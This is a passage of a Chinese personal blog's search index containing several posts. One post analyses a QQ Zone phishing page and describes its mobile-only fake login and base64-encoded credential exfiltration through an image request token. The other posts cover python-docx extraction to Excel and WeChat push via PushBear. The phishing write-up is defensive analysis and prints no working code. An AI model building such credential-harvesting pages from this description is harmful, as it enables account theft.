title="视频制作"></a>视频制作</h4></li><li><p>etc.</p></li></ul><p>其实就是啥都想玩一玩，感觉能做的就去尝试尝试，特别是那种接近实际的。<br>于是乎就<strong>想写啥就写啥</strong>呗。<br>不过基本上以小想法为主，就是随便记录一下这样吧。  </p><hr><p><strong>好啦第一篇就这样随便写写了。<br>溜啦溜啦~</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
            <tag> Life </tag>
            
            <tag> 小想法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小想法 | 某QQ空间盗号页面分析</title>
      <link href="/2019/03/30/Idea_AnalysisOfHackingPage/"/>
      <url>/2019/03/30/Idea_AnalysisOfHackingPage/</url>
      
        <content type="html"><![CDATA[<blockquote><p>搬运自之前的小脑洞小想法啦      </p></blockquote><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>昨晚有个小伙伴空间里把列表都at了（后来知道的），附带P1这张图。  </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/1.jpg" alt="1"></p><p>然后感觉不对劲，肯定是被盗号了。  </p><p>然后突然有个脑洞，去看看这里面有啥吧  </p><h2 id="折腾记录"><a href="#折腾记录" class="headerlink" title="折腾记录"></a>折腾记录</h2><p>用扫码工具（千万别拿QQ来扫，虽然这次的链接没啥大影响）得到二维码文字内容，发现是类似<code>url.cn/...</code>的短链接。</p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/2.jpg" alt="2"></p><p>用电脑浏览器打开，同时打开调试窗口，发现短链接跳转到一个Github.io的页面（P3），很明显是GitHub Pages。   </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/3.png" alt="3"></p><p>于是去GitHub上查找该用户，发现只有个项目，里面就只有一个index.html文件，对应着P2页面，最新版本还是昨天提交的（P4）。   </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/4.png" alt="4"></p><p>感觉不对，于是改变 User Agent 为手机，重新访问短链接，跳转P5页面，是个伪QQ空间登录界面，果然是个钓鱼页面233。 </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/5.png" alt="5"></p><p>点击一键登录，延时一会儿会提示 请安装最新版本QQ 。【忘了密码】及【注册新账号】都是跳转到QQ官方的页面。然后输个123456789啥的测试一下，还会提示 请输入正确账号或者密码 啥的（P6）。  </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/6.png" alt="6"></p><p>乱输一个987321654，噫进去了，跳转到了真的QQ空间，虽然并没有真的登录（P7）。  </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/7.png" alt="7"></p><p>而后在调试窗口network下找了半天，都没发现我提交的账号密码。（P8-9）</p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/8.png" alt="8"></p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/9.png" alt="9"></p><p>顺着remote address查，发现唯一有可能的就是那个user.jpg，还带token参数，隐藏得有点意思，虽然不知道为啥404了。</p><hr><p>jio得还没完，这token咋来的，提交的<strong>账号密码去哪了</strong>emmm，缺点啥。然后查看网页元素，找到了对应的JavaScript代码（P10-11）。</p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/10.png" alt="10"></p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/11.png" alt="11"></p><p>哈哈哈哈哈这个逻辑判断写的还是有点意思的，还把一堆常用简单数字给处理了，难怪前面输123456789玩不来。这个一键登录就是个假的（万一真的估计就得不到账号密码了吧）。点击登录的时候，将用户名密码拼接成json字符串，然后将字符串转换成base64加密传输，而后跳转到官方QQ空间界面。将P9的token用base64解密，果然得到了账号密码（P12）。</p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/12.png" alt="12">  </p><p><em>// 他没调用官方登录接口，没有真的登录到QQ空间已经很友好了，不然更难发现呢</em>  </p><hr><p>到这差不多了，但感觉还没完，我们再来<strong>查查这个域名</strong>吧。</p><p>P13-15注册者信息，这人注册的域名真多。</p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/13.png" alt="13">  </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/14.png" alt="14">  </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/15.png" alt="15"></p><p>用邮箱查询，而后随便访问几个，P16发现都重定向到了一个相似页面，原来那是西部数码上的一个域名经销商。这么说那个人也只是从经销商那里买了个域名而已。</p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/16.png" alt="16"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这是个做得有点水平的钓鱼网站。</p><p><strong>碰到类似的二维码别乱扫，扫了也别登录！</strong></p><p>至于获取账号密码之后把全列表都at，估计还写了别的脚本或者调用了啥接口，这个我还不清楚emmm   </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/17.jpg" alt="又开始了"></p><p>以上内容均基于公开资料，<strong>仅供学习研究使用，请勿用于非法用途</strong>。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Analysis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小想法 </tag>
            
            <tag> QQ空间 </tag>
            
            <tag> 盗号 </tag>
            
            <tag> 分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小想法 | 利用python-docx批量提取Word中的信息进而导入Excel</title>
      <link href="/2019/03/21/Idea_python-docx/"/>
      <url>/2019/03/21/Idea_python-docx/</url>
      
        <content type="html"><![CDATA[<blockquote><p>搬运自之前的小脑洞小想法啦      </p></blockquote><p>又是个小脑洞<br>最近有个比赛要统计一下各组信息，信息来自Word版的申请表。</p><p><img src="/2019/03/21/Idea_python-docx/1.jpg" alt="1"></p><p>考虑到Word要一个一个打开，再复制粘贴。</p><p>简单重复，太难受了8，不如干脆py一下，写个小程序来弄吧。  </p><h2 id="大致思路"><a href="#大致思路" class="headerlink" title="大致思路"></a>大致思路</h2><p>一查发现.docx是以类似xml格式来存放信息的，刚开始思路就想直接解压.docx，从中解析文件然后暴力匹配。。</p><p>而后发现有个<strong>第三方库<code>python-docx</code></strong>，于是乎不想造轮子了，直接拿来用吧。</p><p>然而并没有那么简单，合并的单元格变成独立重复的内容，加个去重吧。</p><h2 id="提取信息"><a href="#提取信息" class="headerlink" title="提取信息"></a>提取信息</h2><p>文字都解析出来了，接下来，来点简单的正则匹配，单独拿个文件来试试，没毛病，挺好的。</p><h2 id="批量读取"><a href="#批量读取" class="headerlink" title="批量读取"></a>批量读取</h2><p>遍历文件夹下所有文件，筛选<code>.docx</code>且排除临时文件，噫少了俩。</p><p>原来还有.doc格式的，另存为.docx <em>(docx库只支持.docx)</em>。</p><p>依次读取每个文件，拼接string列表，得到所需信息。</p><p><img src="/2019/03/21/Idea_python-docx/2.jpg" alt="2"></p><h2 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h2><p>将infolist按照<code>.csv</code>的格式写入文件。</p><blockquote><p>其实可以调用第三方库来实现的。</p></blockquote><h2 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h2><p>实际情况还是挺复杂的，比如表格哪里没填空缺了，或者哪个里面多加几个分隔符什么的，还是出了不少bug，于是继续完善程序，加入相应的处理呗！  </p><p><strong>生产环境真复杂</strong>  </p><p><img src="/2019/03/21/Idea_python-docx/3.jpg" alt="遇到的情况">  </p><p><img src="/2019/03/21/Idea_python-docx/4.jpg" alt="4">  </p><p>如果用Excel打开<code>.csv</code>，发现学号前的0自动丢失，还是觉得不爽emmm （程序猿的自我修养  </p><p>又查了查资料，新建<code>.xlsx</code>，从文本导入到Excel，设置好属性。  </p><p>几好，完事！</p><p><img src="/2019/03/21/Idea_python-docx/5.jpg" alt="修正后的匹配代码">  </p><p><img src="/2019/03/21/Idea_python-docx/6.jpg" alt="最终得到的Excel">  </p><blockquote><p>于是乎边查资料边debug边改代码 花了一个多两个小时<br>估计几个人同时手动做早都做完了  </p></blockquote><p>（其实早就想过用py读取Excel了，但是一直还没试过，这次就先拿py读取Word试试水吧</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Projects </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小想法 </tag>
            
            <tag> Python </tag>
            
            <tag> Projects </tag>
            
            <tag> docx </tag>
            
            <tag> word </tag>
            
            <tag> csv </tag>
            
            <tag> 批量 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小想法 | 基于PushBear API实现微信消息推送</title>
      <link href="/2019/03/07/Idea_PushBearAPI_WeChatPush/"/>
      <url>/2019/03/07/Idea_PushBearAPI_WeChatPush/</url>
      
        <content type="html"><![CDATA[<blockquote><p>搬运自之前的小想法啦~  </p></blockquote><h2 id="调用API"><a href="#调用API" class="headerlink" title="调用API"></a>调用API</h2><p>基于PushBear API实现微信消息提醒  </p><p><a href="http://pushbear.ftqq.com/admin/#/" target="_blank" rel="noopener">PushBear API</a></p><p>用requests里现成的方法就完事了。  </p><h2 id="tkinter-GUI"><a href="#tkinter-GUI" class="headerlink" title="tkinter GUI"></a>tkinter GUI</h2><p>就是直接写代码感觉有点不友好</p><p>于是想做个图形界面</p><p>基于Python GUI库tkinter简单做了一下<br><img src="/2019/03/07/Idea_PushBearAPI_WeChatPush/1.jpg" alt="code">  </p><p><img src="/2019/03/07/Idea_PushBearAPI_WeChatPush/GUI.png" alt="GUI"></p><blockquote><p>（代码手动写布局太难受了<br>（还是直接用代码POST/GET方便emmm<br><em>（突然jio得LabVIEW做图形界面真方便</em></p></blockquote><h2 id="微信推送效果"><a href="#微信推送效果" class="headerlink" title="微信推送效果"></a>微信推送效果</h2><p><img src="/2019/03/07/Idea_PushBearAPI_WeChatPush/push.jpg" alt="推送效果"></p><p><strong>打开后是<code>Markdown</code>渲染的效果呢！</strong>  </p><p><img src="/2019/03/07/Idea_PushBearAPI_WeChatPush/2.jpg" alt="Markdown"></p><p>   （完）  </p><blockquote><p><strong>20191221 Update：</strong>  </p><p>好久没用了不知道现在还能不能用了233</p></blockquote><blockquote><p><strong>20200211 Update:</strong></p><blockquote><p>⚠️ 直发服务转代发的通知（重要）<br>因多次被恶意举报，从2019年6月开始，只提供「已经微信认证后的服务号」进行授权后，用其自有接口权限代发。<a href="http://sc.ftqq.com/6.version" target="_blank" rel="noopener">代发授权和绑定教程</a></p></blockquote><p>最近弄微信消息提醒又来看了看，发现一对多的推送必须要<strong>绑定已认证的服务号</strong>才能使用了。</p><p>但是<strong>Server酱</strong>的给自己绑定的微信号推送消息还是有效的。</p><p>详见：<a href="https://sc.ftqq.com/" target="_blank" rel="noopener">https://sc.ftqq.com/</a></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Projects </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小想法 </tag>
            
            <tag> Python </tag>
            
            <tag> Projects </tag>
            
            <tag> API </tag>
            
            <tag> 微信 </tag>
            
            <tag> 消息推送 </tag>
            
            <tag> GUI </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
